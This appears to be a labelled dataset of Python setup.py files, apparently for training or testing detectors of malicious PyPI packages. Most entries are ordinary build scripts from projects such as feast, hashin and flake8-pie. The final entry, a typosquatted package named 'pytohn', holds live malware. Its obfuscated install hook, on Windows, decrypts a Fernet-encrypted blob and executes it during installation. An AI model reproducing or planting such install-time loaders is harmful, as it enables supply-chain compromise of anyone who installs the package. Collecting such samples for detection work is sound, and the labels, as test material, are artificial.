None\n\nPROTO_SUBDIRS = [\"core\", \"serving\", \"types\", \"storage\"]\nPYTHON_CODE_PREFIX = \"sdk/python\"\n\n\nclass BuildPythonProtosCommand(Command):\n    description = \"Builds the proto files into Python files.\"\n    user_options = [\n        (\"inplace\", \"i\", \"Write generated proto files to source directory.\"),\n    ]\n\n    def initialize_options(self):\n        self.python_protoc = [\n            sys.executable,\n            \"-m\",\n            \"grpc_tools.protoc\",\n        ]  # find_executable(\"protoc\")\n        self.proto_folder = os.path.join(repo_root, \"protos\")\n        self.sub_folders = PROTO_SUBDIRS\n        self.build_lib = None\n        self.inplace = 0\n\n    def finalize_options(self):\n        self.set_undefined_options(\"build\", (\"build_lib\", \"build_lib\"))\n\n    @property\n    def python_folder(self):\n        if self.inplace:\n            return os.path.join(\n                os.path.dirname(__file__) or os.getcwd(), \"sdk/python/feast/protos\"\n            )\n\n        return os.path.join(self.build_lib, \"feast/protos\")\n\n    def _generate_python_protos(self, path: str):\n        proto_files = glob.glob(os.path.join(self.proto_folder, path))\n        Path(self.python_folder).mkdir(parents=True, exist_ok=True)\n        subprocess.check_call(\n            self.python_protoc\n            + [\n                \"-I\",\n                self.proto_folder,\n                \"--python_out\",\n                self.python_folder,\n                \"--grpc_python_out\",\n                self.python_folder,\n                \"--mypy_out\",\n                self.python_folder,\n            ]\n            + proto_files\n        )\n\n    def run(self):\n        for sub_folder in self.sub_folders:\n            self._generate_python_protos(f\"feast/{sub_folder}/*.proto\")\n            # We need the __init__ files for each of the generated subdirs\n            # so that they are regular packages, and don't need the `--namespace-packages` flags\n            # when being typechecked using mypy.\n            with open(f\"{self.python_folder}/feast/{sub_folder}/__init__.py\", \"w\"):\n                pass\n\n        with open(f\"{self.python_folder}/__init__.py\", \"w\"):\n            pass\n        with open(f\"{self.python_folder}/feast/__init__.py\", \"w\"):\n            pass\n\n        for path in Path(self.python_folder).rglob(\"*.py\"):\n            for folder in self.sub_folders:\n                # Read in the file\n                with open(path, \"r\") as file:\n                    filedata = file.read()\n\n                # Replace the target string\n                filedata = filedata.replace(\n                    f\"from feast.{folder}\", f\"from feast.protos.feast.{folder}\"\n                )\n\n                # Write the file out again\n                with open(path, \"w\") as file:\n                    file.write(filedata)\n\n\ndef _generate_path_with_gopath():\n    go_path = subprocess.check_output([\"go\", \"env\", \"GOPATH\"]).decode(\"utf-8\")\n    go_path = go_path.strip()\n    path_val = os.getenv(\"PATH\")\n    path_val = f\"{path_val}:{go_path}/bin\"\n\n    return path_val\n\n\ndef _ensure_go_and_proto_toolchain():\n    try:\n        version = subprocess.check_output([\"go\", \"version\"])\n    except Exception as e:\n        raise RuntimeError(\"Unable to find go toolchain\") from e\n\n    semver_string = re.search(r\"go[\\S]+\", str(version)).group().lstrip(\"go\")\n    parts = semver_string.split(\".\")\n    if not (int(parts[0]) >= 1 and int(parts[1]) >= 16):\n        raise RuntimeError(f\"Go compiler too old; expected 1.16+ found {semver_string}\")\n\n    path_val = _generate_path_with_gopath()\n\n    try:\n        subprocess.check_call([\"protoc-gen-go\", \"--version\"], env={\"PATH\": path_val})\n        subprocess.check_call(\n            [\"protoc-gen-go-grpc\", \"--version\"], env={\"PATH\": path_val}\n        )\n    except Exception as e:\n        raise RuntimeError(\"Unable to find go/grpc extensions for protoc\") from e\n\n\nclass BuildGoProtosCommand(Command):\n    description = \"Builds the proto files into Go files.\"\n    user_options = []\n\n    def initialize_options(self):\n        self.go_protoc = [\n            sys.executable,\n            \"-m\",\n            \"grpc_tools.protoc\",\n        ]  # find_executable(\"protoc\")\n        self.proto_folder = os.path.join(repo_root, \"protos\")\n        self.go_folder = os.path.join(repo_root, \"go/protos\")\n        self.sub_folders = PROTO_SUBDIRS\n        self.path_val = _generate_path_with_gopath()\n\n    def finalize_options(self):\n        pass\n\n    def _generate_go_protos(self, path: str):\n        proto_files = glob.glob(os.path.join(self.proto_folder, path))\n\n        try:\n            subprocess.check_call(\n                self.go_protoc\n                + [\n                    \"-I\",\n                    self.proto_folder,\n                    \"--go_out\",\n                    self.go_folder,\n                    \"--go_opt=module=github.com/feast-dev/feast/go/protos\",\n                    \"--go-grpc_out\",\n                    self.go_folder,\n                    \"--go-grpc_opt=module=github.com/feast-dev/feast/go/protos\",\n                ]\n                + proto_files,\n                env={\"PATH\": self.path_val},\n            )\n        except CalledProcessError as e:\n            print(f\"Stderr: {e.stderr}\")\n            print(f\"Stdout: {e.stdout}\")\n\n    def run(self):\n        go_dir = Path(repo_root) / \"go\" / \"protos\"\n        go_dir.mkdir(exist_ok=True)\n        for sub_folder in self.sub_folders:\n            self._generate_go_protos(f\"feast/{sub_folder}/*.proto\")\n\n\nclass BuildCommand(build_py):\n    \"\"\"Custom build command.\"\"\"\n\n    def run(self):\n        self.run_command(\"build_python_protos\")\n        if os.getenv(\"COMPILE_GO\", \"false\").lower() == \"true\":\n            _ensure_go_and_proto_toolchain()\n            self.run_command(\"build_go_protos\")\n\n        self.run_command(\"build_ext\")\n        build_py.run(self)\n\n\nclass DevelopCommand(develop):\n    \"\"\"Custom develop command.\"\"\"\n\n    def run(self):\n        self.reinitialize_command(\"build_python_protos\", inplace=1)\n        self.run_command(\"build_python_protos\")\n        if os.getenv(\"COMPILE_GO\", \"false\").lower() == \"true\":\n            _ensure_go_and_proto_toolchain()\n            self.run_command(\"build_go_protos\")\n\n        develop.run(self)\n\n\nclass build_ext(_build_ext):\n    def finalize_options(self) -> None:\n        super().finalize_options()\n        if os.getenv(\"COMPILE_GO\", \"false\").lower() == \"false\":\n            self.extensions = [e for e in self.extensions if not self._is_go_ext(e)]\n\n    def _is_go_ext(self, ext: Extension):\n        return any(\n            source.endswith(\".go\") or source.startswith(\"github\")\n            for source in ext.sources\n        )\n\n    def build_extension(self, ext: Extension):\n        print(f\"Building extension {ext}\")\n        if not self._is_go_ext(ext):\n            # the base class may mutate `self.compiler`\n            compiler = copy.deepcopy(self.compiler)\n            self.compiler, compiler = compiler, self.compiler\n            try:\n                return _build_ext.build_extension(self, ext)\n            finally:\n                self.compiler, compiler = compiler, self.compiler\n\n        bin_path = _generate_path_with_gopath()\n        go_env = json.loads(\n            subprocess.check_output([\"go\", \"env\", \"-json\"]).decode(\"utf-8\").strip()\n        )\n\n        print(f\"Go env: {go_env}\")\n        print(f\"CWD: {os.getcwd()}\")\n\n        destination = os.path.dirname(os.path.abspath(self.get_ext_fullpath(ext.name)))\n        subprocess.check_call(\n            [\"go\", \"install\", \"golang.org/x/tools/cmd/goimports\"],\n            env={\"PATH\": bin_path, **go_env},\n        )\n        subprocess.check_call(\n            [\"go\", \"get\", \"github.com/go-python/gopy@v0.4.4\"],\n            env={\"PATH\": bin_path, **go_env},\n        )\n        subprocess.check_call(\n            [\"go\", \"install\", \"github.com/go-python/gopy\"],\n            env={\"PATH\": bin_path, **go_env},\n        )\n        subprocess.check_call(\n            [\n                \"gopy\",\n                \"build\",\n                \"-output\",\n                destination,\n                \"-vm\",\n                sys.executable,\n                \"--build-tags\",\n                \"cgo,ccalloc\",\n                \"--dynamic-link=True\",\n                \"-no-make\",\n                *ext.sources,\n            ],\n            env={\n                \"PATH\": bin_path,\n                \"CGO_LDFLAGS_ALLOW\": \".*\",\n                **go_env,\n            },\n        )\n\n    def copy_extensions_to_source(self):\n        build_py = self.get_finalized_command(\"build_py\")\n        for ext in self.extensions:\n            fullname = self.get_ext_fullname(ext.name)\n            modpath = fullname.split(\".\")\n            package = \".\".join(modpath[:-1])\n            package_dir = build_py.get_package_dir(package)\n\n            src_dir = dest_dir = package_dir\n\n            if src_dir.startswith(PYTHON_CODE_PREFIX):\n                src_dir = package_dir[len(PYTHON_CODE_PREFIX) :]\n            src_dir = src_dir.lstrip(\"/\")\n\n            src_dir = os.path.join(self.build_lib, src_dir)\n\n            # copy whole directory\n            print(f\"Copying from {src_dir} to {dest_dir}\")\n            copy_tree(src_dir, dest_dir)\n\n\nsetup(\n    name=NAME,\n    author=AUTHOR,\n    description=DESCRIPTION,\n    long_description=LONG_DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    python_requires=REQUIRES_PYTHON,\n    url=URL,\n    packages=find_packages(\n        where=PYTHON_CODE_PREFIX, exclude=(\"java\", \"infra\", \"sdk/python/tests\", \"ui\")\n    ),\n    package_dir={\"\": PYTHON_CODE_PREFIX},\n    install_requires=REQUIRED,\n    # https://stackoverflow.com/questions/28509965/setuptools-development-requirements\n    # Install dev requirements with: pip install -e .[dev]\n    extras_require={\n        \"dev\": DEV_REQUIRED,\n        \"ci\": CI_REQUIRED,\n        \"gcp\": GCP_REQUIRED,\n        \"aws\": AWS_REQUIRED,\n        \"redis\": REDIS_REQUIRED,\n        \"snowflake\": SNOWFLAKE_REQUIRED,\n        \"spark\": SPARK_REQUIRED,\n        \"trino\": TRINO_REQUIRED,\n        \"postgres\": POSTGRES_REQUIRED,\n        \"mysql\": MYSQL_REQUIRED,\n        \"ge\": GE_REQUIRED,\n        \"hbase\": HBASE_REQUIRED,\n        \"go\": GO_REQUIRED,\n        \"docs\": DOCS_REQUIRED,\n    },\n    include_package_data=True,\n    license=\"Apache\",\n    classifiers=[\n        # Trove classifiers\n        # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n    ],\n    entry_points={\"console_scripts\": [\"feast=feast.cli:cli\"]},\n    use_scm_version=use_scm_version,\n    setup_requires=[\n        \"setuptools_scm\",\n        \"grpcio>=1.47.0\",\n        \"grpcio-tools>=1.47.0\",\n        \"mypy-protobuf==3.1\",\n        \"pybindgen==0.22.0\",\n        \"sphinx!=4.0.0\",\n    ],\n    cmdclass={\n        \"build_python_protos\": BuildPythonProtosCommand,\n        \"build_go_protos\": BuildGoProtosCommand,\n        \"build_py\": BuildCommand,\n        \"develop\": DevelopCommand,\n        \"build_ext\": build_ext,\n    },\n    ext_modules=[\n        Extension(\n            \"feast.embedded_go.lib._embedded\",\n            [\"github.com/feast-dev/feast/go/embedded\"],\n        )\n    ],\n)\n", "target": 0}
{"idx": "datetime_truncate-1.1.1", "func": "# -*- encoding: utf-8 -*-\nimport setuptools\nfrom distutils.core import setup\n\nsetup(\n    name='datetime_truncate',\n    version='1.1.1',\n    url='https://github.com/mediapop/datetime_truncate',\n    author='Bj\u00f6rn Andersson / Media Pop',\n    author_email='bjorn@mediapop.co',\n    description='Truncate datetime objects to a set level of precision',\n    license='BSD',\n    long_description=open('README.rst').read(),\n    packages=['datetime_truncate'],\n    package_data={\n        '': ['README.rst']\n    },\n    include_package_data=True,\n    test_suite='nose.collector',\n    tests_require=['nose>=1.2.1'],\n    classifiers=[\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Programming Language :: Python',\n    ],\n)\n", "target": 0}
{"idx": "flake8_2020-1.7.0", "func": "from __future__ import annotations\n\nfrom setuptools import setup\nsetup()\n", "target": 0}
{"idx": "erroranalysis-0.3.8", "func": "# Copyright (c) Microsoft Corporation\n# Licensed under the MIT License.\n\nimport setuptools\n\nwith open('erroranalysis/version.py') as f:\n    code = compile(f.read(), f.name, 'exec')\n    exec(code)\n\n# Fetch ReadMe\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\n# Use requirements.txt to set the install_requires\nwith open('requirements.txt') as f:\n    install_requires = [line.strip() for line in f]\n\nsetuptools.setup(\n    name=name,  # noqa: F821\n    version=version,  # noqa: F821\n    author=\"Roman Lutz, Ilya Matiach, Ke Xu\",\n    author_email=\"raiwidgets-maintain@microsoft.com\",\n    description=\"Core error analysis APIs\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/microsoft/responsible-ai-widgets\",\n    packages=setuptools.find_packages(),\n    python_requires='>=3.6',\n    install_requires=install_requires,\n    classifiers=[\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Development Status :: 3 - Alpha\"\n    ]\n)\n", "target": 0}
{"idx": "hashin-0.17.0", "func": "from os import path\n\nfrom setuptools import setup\n\n\n_here = path.dirname(__file__)\n\n# Prevent spurious errors during `python setup.py test`, a la\n# http://www.eby-sarna.com/pipermail/peak/2010-May/003357.html:\ntry:\n    import multiprocessing\n\n    multiprocessing = multiprocessing  # take it easy pyflakes\nexcept ImportError:\n    pass\n\nsetup(\n    name=\"hashin\",\n    version=\"0.17.0\",\n    description=\"Edits your requirements.txt by hashing them in\",\n    long_description=open(path.join(_here, \"README.rst\")).read(),\n    author=\"Peter Bengtsson\",\n    author_email=\"mail@peterbe.com\",\n    license=\"MIT\",\n    py_modules=[\"hashin\"],\n    entry_points={\"console_scripts\": [\"hashin = hashin:main\"]},\n    url=\"https://github.com/peterbe/hashin\",\n    include_package_data=True,\n    python_requires=\">=2.7,!=3.0,!=3.1,!=3.2,!=3.3\",\n    install_requires=[\"packaging\", \"pip-api\", 'futures; python_version == \"2.7\"'],\n    tests_require=[\"pytest\", \"mock\"],\n    setup_requires=[\"pytest-runner\"],\n    extras_require={\"dev\": [\"tox\", \"twine\"]},\n    classifiers=[\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: System Administrators\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Software Development :: Build Tools\",\n        \"Topic :: System :: Installation/Setup\",\n        \"Topic :: System :: Systems Administration\",\n    ],\n    keywords=[\n        \"pip\",\n        \"repeatable\",\n        \"deploy\",\n        \"deployment\",\n        \"hash\",\n        \"install\",\n        \"installer\",\n    ],\n)\n", "target": 0}
{"idx": "flake8-pie-0.16.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['flake8_pie', 'flake8_pie.tests']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['typing_extensions']\n\nentry_points = \\\n{'flake8.extension': ['PIE = flake8_pie:Flake8PieCheck']}\n\nsetup_kwargs = {\n    'name': 'flake8-pie',\n    'version': '0.16.0',\n    'description': 'A flake8 extension that implements misc. lints',\n    'long_description': '# flake8-pie [![CircleCI](https://circleci.com/gh/sbdchd/flake8-pie.svg?style=svg)](https://circleci.com/gh/sbdchd/flake8-pie) [![pypi](https://img.shields.io/pypi/v/flake8-pie.svg)](https://pypi.org/project/flake8-pie/)\\n\\n> A flake8 extension that implements misc. lints\\n\\n## lints\\n\\n### PIE781: assign-and-return\\n\\nBased on Clippy\\'s\\n[`let_and_return`](https://rust-lang.github.io/rust-clippy/master/index.html#let_and_return)\\nand Microsoft\\'s TSLint rule\\n[`no-unnecessary-local-variable`](https://github.com/Microsoft/tslint-microsoft-contrib).\\n\\nFor more info on the structure of this lint, see the [accompanying blog\\npost](https://steve.dignam.xyz/2018/12/16/creating-a-flake8-lint/).\\n\\n#### examples\\n\\n```python\\n# error\\ndef foo():\\n   x = bar()\\n   return x\\n\\n# allowed\\ndef foo():\\n   x, _ = bar()\\n   return x\\n```\\n\\n### PIE783: celery-explicit-names\\n\\nWarn about [Celery](https://pypi.org/project/celery/) task definitions that don\\'t have explicit names.\\n\\nNote: this lint is kind of naive considering any decorator with a `.task()`\\nmethod or any decorator called `shared_task()` a Celery decorator.\\n\\n#### examples\\n\\n```python\\n# error\\n@app.task()\\ndef foo():\\n    pass\\n\\n# ok\\n@app.task(name=\"app_name.tasks.foo\")\\ndef foo():\\n    pass\\n```\\n\\n### PIE784: celery-explicit-crontab-args\\n\\nThe `crontab` class provided by Celery has some default args that are\\nsuprising to new users. Specifically, `crontab(hour=\"0,12\")` won\\'t run a task\\nat midnight and noon, it will run the task at every minute during those two\\nhours. This lint makes that call an error, forcing you to write\\n`crontab(hour=\"0, 12\", minute=\"*\")`.\\n\\nAdditionally, the lint is a bit more complex in that it requires you specify\\nevery smaller increment than the largest time increment you provide. So if you\\nprovide `days_of_week`, then you need to provide `hour`s and `minute`s\\nexplicitly.\\n\\nNote: if you like the default behavior of `crontab()` then you can either\\ndisable this lint or pass `\"*\"` for the `kwarg` value, e.g., `minutes=\"*\"`.\\n\\nAlso, since this lint is essentially a naive search for calls to a\\n`crontab()` function, if you have a function named the same then this will\\ncause false positives.\\n\\n### PIE785: celery-require-tasks-expire\\n\\nCelery tasks can bunch up if they don\\'t have expirations.\\n\\nThis enforces specifying expirations in both the celery beat config dict and\\nin `.apply_async()` calls.\\n\\nThe same caveat applies about how this lint is naive.\\n\\n### PIE786: precise-exception-handlers\\n\\nBe precise in what exceptions you catch. Bare `except:` handlers, catching `BaseException`, or catching `Exception` can lead to unexpected bugs.\\n\\n#### examples\\n\\n```python\\n# error\\ntry:\\n    save_file(name=\"export.csv\")\\nexcept:\\n    pass\\n\\n# error\\ntry:\\n    save_file(name=\"export.csv\")\\nexcept BaseException:\\n    pass\\n\\n# error\\ntry:\\n    save_file(name=\"export.csv\")\\nexcept Exception:\\n    pass\\n\\n# error\\ntry:\\n    save_file(name=\"export.csv\")\\nexcept (ValueError, Exception):\\n    pass\\n\\n\\n# ok\\ntry:\\n    save_file(name=\"export.csv\")\\nexcept OSError:\\n    pass\\n```\\n\\n### PIE787: no-len-condition\\n\\nEmpty collections are fasley in Python so calling `len()` is unnecessary when\\nchecking for emptiness in an if statement/expression.\\n\\nComparing to explicit scalars is allowed.\\n\\n```python\\n# error\\nif len(foo): ...\\nif not len(foo): ...\\n\\n# ok\\nif foo: ...\\nif not foo: ...\\nif len(foo) > 0: ...\\nif len(foo) == 0: ...\\n```\\n\\n### PIE788: no-bool-condition\\n\\nIf statements/expressions evalute the truthiness of the their test argument,\\nso calling `bool()` is unnecessary.\\n\\nComparing to `True`/`False` is allowed.\\n\\n```python\\n# error\\nif bool(foo): ...\\nif not bool(foo): ...\\n\\n# ok\\nif foo: ...\\nif not foo: ...\\nif bool(foo) is True: ...\\nif bool(foo) is False: ...\\n```\\n\\n### PIE789: prefer-isinstance-type-compare\\n\\nUsing `type()` doesn\\'t take into account subclassess and type checkers won\\'t\\nrefine the type, use `isinstance` instead.\\n\\n```python\\n# error\\nif type(foo) == str: ...\\nif type(foo) is str: ...\\nif type(foo) in [int, str]: ...\\n\\n# ok\\nif isinstance(foo, str): ...\\nif isinstance(foo, (int, str)): ...\\n```\\n\\n### PIE790: no-unnecessary-pass\\n\\n`pass` is unnecessary when definining a `class` or function with an empty\\nbody.\\n\\n```python\\n# error\\nclass BadError(Exception):\\n    \"\"\"\\n    some doc comment\\n    \"\"\"\\n    pass\\n\\ndef foo() -> None:\\n    \"\"\"\\n    some function\\n    \"\"\"\\n    pass\\n\\n# ok\\nclass BadError(Exception):\\n    \"\"\"\\n    some doc comment\\n    \"\"\"\\n\\ndef foo() -> None:\\n    \"\"\"\\n    some function\\n    \"\"\"\\n```\\n\\n### PIE791: no-pointless-statements\\n\\nComparisions without an assignment or assertion are probably a typo.\\n\\n```python\\n# error\\n\"foobar\" in data\\nres.json() == []\\nuser.is_authenticated() is True\\n\\n# ok\\nassert \"foobar\" in data\\nfoo = res.json() == []\\nuse.is_authenticated()\\n```\\n\\n### PIE792: no-inherit-object\\n\\nInheriting from `object` isn\\'t necessary in Python 3.\\n\\n```python\\n# error\\nclass Foo(object):\\n    ...\\n\\n# ok\\nclass Foo:\\n    ...\\n```\\n\\n### PIE793: prefer-dataclass\\n\\nAttempts to find cases where the `@dataclass` decorator is unintentionally\\nmissing.\\n\\n```python\\n# error\\nclass Foo:\\n    z: dict[int, int]\\n    def __init__(self) -> None: ...\\n\\nclass Bar:\\n    x: list[str]\\n\\n# ok\\nclass Bar(Foo):\\n    z: dict[int, int]\\n\\n@dataclass\\nclass Bar:\\n    x: list[str]\\n```\\n\\n### PIE794: dupe-class-field-definitions\\n\\nFinds duplicate definitions for the same field, which can occur in large ORM\\nmodel definitions.\\n\\n```python\\n# error\\nclass User(BaseModel):\\n    email = fields.EmailField()\\n    # ...80 more properties...\\n    email = fields.EmailField()\\n\\n# ok\\nclass User(BaseModel):\\n    email = fields.EmailField()\\n    # ...80 more properties...\\n```\\n\\n### PIE795: prefer-stdlib-enums\\n\\nInstead of defining various constant properties on a class, use the stdlib\\nenum which typecheckers support for type refinement.\\n\\n```python\\n# error\\nclass Foo:\\n    A = \"A\"\\n    B = \"B\"\\n    C = \"C\"\\n\\n# ok\\nimport enum\\nclass Foo(enum.Enum):\\n    A = \"A\"\\n    B = \"B\"\\n    C = \"C\"\\n```\\n\\n### PIE796: prefer-unique-enums\\n\\nBy default the stdlib enum allows multiple field names to map to the same\\nvalue, this lint requires each enum value be unique.\\n\\n```python\\n# error\\nclass Foo(enum.Enum):\\n    A = \"A\"\\n    B = \"B\"\\n    C = \"C\"\\n    D = \"C\"\\n\\n# ok\\nclass Foo(enum.Enum):\\n    A = \"A\"\\n    B = \"B\"\\n    C = \"C\"\\n    D = \"D\"\\n```\\n\\n### PIE797: no-unnecessary-if-expr\\n\\nCall `bool()` directly rather than reimplementing its functionality.\\n\\n```python\\n# error\\nfoo(is_valid=True if buzz() else False)\\n\\n# ok\\nfoo(is_valid=bool(buzz()))\\n```\\n\\n### PIE798: no-unnecessary-class\\n\\nInstead of using class to namespace functions, use a module.\\n\\n```python\\n# error\\nclass UserManager:\\n    class User(NamedTuple):\\n        name: str\\n\\n    @classmethod\\n    def update_user(cls, user: User) -> None:\\n        ...\\n\\n    @staticmethod\\n    def sync_users() -> None:\\n        ...\\n\\n# ok\\nclass User(NamedTuple):\\n    name: str\\n\\ndef update_user(user: User) -> None:\\n    ...\\n\\ndef sync_users() -> None:\\n    ...\\n```\\n\\n### PIE799: prefer-col-init\\n\\nCheck that values are passed in when collections are created rather than\\ncreating an empty collection and then inserting.\\n\\n```python\\n# error\\nbars = []\\nbar = bar()\\nbars.append(bar)\\n\\n# ok\\nbar = bar()\\nbars = [bar]\\n\\n# error\\ns = deque()\\ns.append(foo)\\n\\n# ok\\ns = deque([foo])\\n```\\n\\n### PIE800: no-unnecessary-spread\\n\\nCheck for unnecessary dict unpacking.\\n\\n```python\\n# error\\n{**foo, **{\"bar\": 10}}\\n\\n# ok\\n{**foo, \"bar\": 10}\\n```\\n\\n### PIE801: prefer-simple-return\\n\\nReturn boolean expressions directly instead of returning `True` and `False`.\\n\\n```python\\n# error\\ndef main():\\n    if foo > 5:\\n        return True\\n    return False\\n\\n# error\\ndef main():\\n    if foo > 5:\\n        return True\\n    else:\\n        return False\\n\\n# ok\\ndef main():\\n    return foo > 5\\n```\\n\\n### PIE802: prefer-simple-any-all\\n\\nRemove unnecessary comprehensions for `any` and `all`\\n\\n```python\\n# error\\nany([x.id for x in bar])\\nall([x.id for x in bar])\\n\\n# ok\\nall(x.id for x in bar)\\nany(x.id for x in bar)\\nany({x.id for x in bar})\\n```\\n\\n### PIE803: prefer-logging-interpolation\\n\\nDon\\'t format strings before logging. Let `logging` interpolate arguments.\\n\\nThis allows Sentry to aggregate logs, prevents raising exceptions if interpolation fails, and improves performance if the log level is disabled. See [\"PyCQA/pylint#1788\"](https://github.com/PyCQA/pylint/issues/1788#issuecomment-461279687).\\n\\n```python\\n# error\\nlogger.info(\"Login error for %s\" % user)\\nlogger.info(\"Login error for %s, %s\" % (user_id, name))\\n\\n# error\\nlogger.info(\"Login error for {}\".format(user))\\nlogger.info(\"Login error for {}, {}\".format(user_id, name))\\n\\n# error\\nlogger.info(f\"Login error for {user}\")\\nlogger.info(f\"Login error for {user_id}, {name}\")\\n\\n# ok\\nlogger.info(\"Login error for %s\", user)\\nlogger.info(\"Login error for %s, %s\", user_id, name)\\n```\\n\\n### PIE804: no-unnecessary-dict-kwargs\\n\\nAs long as the keys of the dict are valid Python identifier names, we can safely\\nremove the surrounding dict.\\n\\n```python\\n# error\\nfoo(**{\"bar\": True})\\n\\n# ok\\nfoo(bar=True)\\nfoo(**buzz)\\nfoo(**{\"bar foo\": True})\\n```\\n\\n## dev\\n\\n```shell\\n# install dependencies\\npoetry install\\n\\ns/lint\\ns/test\\n```\\n\\n### PIE805: prefer-literal\\n\\nCurrently only checks for byte string literals.\\n\\n```python\\n# error\\n\"foo\".encode()\\n\\n# ok\\nb\"foo\"\\n\"\ud83d\ude00\".encode()\\n```\\n\\n### PIE806: no-assert-except\\n\\nInstead of `assert`ing and catching the exception, use an if statement.\\n\\n```python\\n# error\\ntry:\\n    assert \"@\" in bar\\nexcept AssertionError:\\n    ...\\n\\n# ok\\nif \"@\" in bar:\\n    ...\\n```\\n\\n### PIE807: prefer-list-builtin\\n\\n`lambda: []` is equivalent to the builtin `list`\\n\\n```python\\n# error\\n@dataclass\\nclass Foo:\\n    foo: List[str] = field(default_factory=lambda: [])\\n\\n# ok\\n@dataclass\\nclass Foo:\\n    foo: List[str] = field(default_factory=list)\\n```\\n\\n### PIE808: prefer-simple-range\\n\\nWe can leave out the first argument to `range` in some cases since the default\\nstart position is 0.\\n\\n```python\\n# err\\nrange(0, 10)\\n\\n# ok\\nrange(10)\\nrange(x, 10)\\nrange(0, 10, x)\\n```\\n\\n### PIE809: django-prefer-bulk\\n\\nBulk create multiple objects instead of executing O(N) queries.\\n\\n```python\\n# error\\n[Item.objects.create(item) for item in items]\\n\\n# error\\n[Item.objects.create(item) for item in [bar for bar in buzz]]\\n\\n# error\\n(Item.objects.create(item) for item in items)\\n\\n# ok\\nItem.objects.insert(items)\\nItem.objects.create(item)\\n```\\n\\n## development\\n\\n### examining the AST\\nYou can use `astpretty` to dump the AST of a piece of code.\\n\\n```shell\\n./.venv/bin/astpretty <(pbpaste)\\n```\\n\\n### uploading a new version to [PyPi](https://pypi.org)\\n\\n```shell\\n# increment `Flake8PieCheck.version` and pyproject.toml `version`\\n\\n# build new distribution files and upload to pypi\\n# Note: this will ask for login credentials\\nrm -rf dist && poetry publish --build\\n```\\n',\n    'author': 'Steve Dignam',\n    'author_email': 'steve@dignam.xyz',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/sbdchd/flake8-pie',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.7',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "django-redis-5.2.0", "func": "from setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "pytohn-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'cYCIETPvbiwNkztnCmFWOIeNycmXkfsI zJBPkNWugwHEIqeMPnfGo'\nLONG_DESCRIPTION = 'ZQtRKbxrkVqgtRSFxdTXaJxBCcbBPAlArqxbxziHEWQWEzpTfKRyfWJWQoqyLmS ULmZFPvjhGqpdTLHialAVZYcapVQPFC llhOqLsQklw JekCmtwxaRqaLnTjfoMmNfAewg HomslZTykMJIOZJvhk WkjvRzLtnkMDrMfJLYILOuMJCJLkUMkvUuJzaQLLbE xkkydLWgXhVGumOXosn oVoFKnyVchcCrucqGbcgxSsxpZStaaVNJiIYUHYvgFbADKavhNpWStHRheUNOdjTTllPiXdlrAPIkbMxakHKqQRCCjgLhfEDBlZwSJpgZwxxmtDdADTFhD DzzmZrvQrqQNUmeEuZlNgcglgfrBBT'\n\n\nclass wzUUWmwlJndjbHeKaiPzEosSgyCiGcMeGWsInfrNgdsiFfsdUkZleSTRJpXTXRmsMJgExhmqimvMyAWcufdkJOaoBpigXNubOxWAfkwDDHVvxfQYUEytnXwCkUENIlgqDxGbjda(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'mlFSuOEB3oTD9G5d7dWw1cDdZlPcGcD_PwjyfBptMTs=').decrypt(b'gAAAAABmbvJrNQRqfPgbb-P0PZaFh0-BfVtk-MSpDEex-IY94AkC32171QUJMwbj3vTp_ays0uldGWe0CCIy47uN4k1dmQmhi5EWVCdNwlnWleYHz4dA6Gh2qVjNIV6Q1VgJaVlli97ghl7tZe4NBfIp_MhgQvbaRzw5WxFBo3mfbnC-C1s2PD4W72ZgeQ2U0eDD_7VC1DzHWNfaugGqL3G38A0wCzmtQg=='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"pytohn\",\n    version=VERSION,\n    author=\"JOifjIMKeKwOuXA\",\n    author_email=\"iuMFiXeYbMUzcf@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': wzUUWmwlJndjbHeKaiPzEosSgyCiGcMeGWsInfrNgdsiFfsdUkZleSTRJpXTXRmsMJgExhmqimvMyAWcufdkJOaoBpigXNubOxWAfkwDDHVvxfQYUEytnXwCkUENIlgqDxGbjda,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
